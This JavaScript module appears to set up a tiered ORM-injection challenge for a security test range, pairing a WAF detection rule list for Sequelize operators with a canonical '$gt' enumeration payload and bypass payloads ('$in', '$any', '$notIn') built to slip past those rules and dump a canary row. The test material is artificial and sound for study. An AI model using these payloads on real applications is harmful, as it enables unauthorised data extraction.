// ORM Injection — tiered.
// T0: no WAF; canonical `{"id":{"$gt":0}}` enumerates the table.
// T1: WAF blocks the `$gt`/`$ne` operator key inputs. Bypasses use
//     alternate Sequelize operator aliases that the rule set doesn't
//     enumerate (e.g. `$in: [...]` matching with a list that covers
//     the canary row, `$or: [...]` decomposition).

export const RULE_POOL = [
  { name: 'orm-op-gt',     pattern: '"\\$gt"',     flags: 'i' },
  { name: 'orm-op-lt',     pattern: '"\\$lt"',     flags: 'i' },
  { name: 'orm-op-ne',     pattern: '"\\$ne"',     flags: 'i' },
  { name: 'orm-op-or',     pattern: '"\\$or"',     flags: 'i' },
  { name: 'orm-op-not',    pattern: '"\\$not"',    flags: 'i' },
  { name: 'orm-op-like',   pattern: '"\\$like"',   flags: 'i' },
  { name: 'orm-op-iLike',  pattern: '"\\$iLike"',  flags: 'i' },
  { name: 'orm-op-between',pattern: '"\\$between"',flags: 'i' },
]

export const BYPASS_TEMPLATES = [
  // $in covers a wide ID range, sweeping the canary row in
  (canary, scenario) => JSON.stringify({ id: { $in: Array.from({ length: 200 }, (_, i) => i + 1) } }),
  // $any with array — Sequelize supports this for Postgres ANY()
  (canary, scenario) => JSON.stringify({ id: { $any: Array.from({ length: 200 }, (_, i) => i + 1) } }),
  // $notIn with empty list — returns all rows
  (canary, scenario) => JSON.stringify({ id: { $notIn: [-1] } }),
]

export const defences = {
  0: {
    canonicalPayload: () => JSON.stringify({ id: { $gt: 0 } }),
    naiveBlockedExpected: false,
    bypassPayloads: [],
  },
  1: {
    canonicalPayload: () => JSON.stringify({ id: { $gt: 0 } }),
    naiveBlockedExpected: true,
    bypassPayloads: BYPASS_TEMPLATES,
  },
}

export function generateT1Config(rng = Math.random) {
  // Block $gt, $lt, $ne, $or by default (the obvious operators). The
  // bypasses use $in / $any / $notIn which are deliberately NOT in the
  // required set, so they survive.
  const required = ['orm-op-gt', 'orm-op-lt', 'orm-op-ne', 'orm-op-or']
  const optional = RULE_POOL.filter(r => !required.includes(r.name) && !['orm-op-like', 'orm-op-iLike', 'orm-op-between', 'orm-op-not'].includes(r.name))
  const shuffled = [...optional].sort(() => rng() - 0.5)
  const picked = [
    ...RULE_POOL.filter(r => required.includes(r.name)),
    ...shuffled,
  ]
  const styles = ['cloudflare1020', 'awsCloudfront', 'modSecurity', 'generic403', 'fake500', 'silent200']
  return {
    waf: {
      rules: picked,
      blockPageStyle: styles[Math.floor(rng() * styles.length)],
    },
  }
}
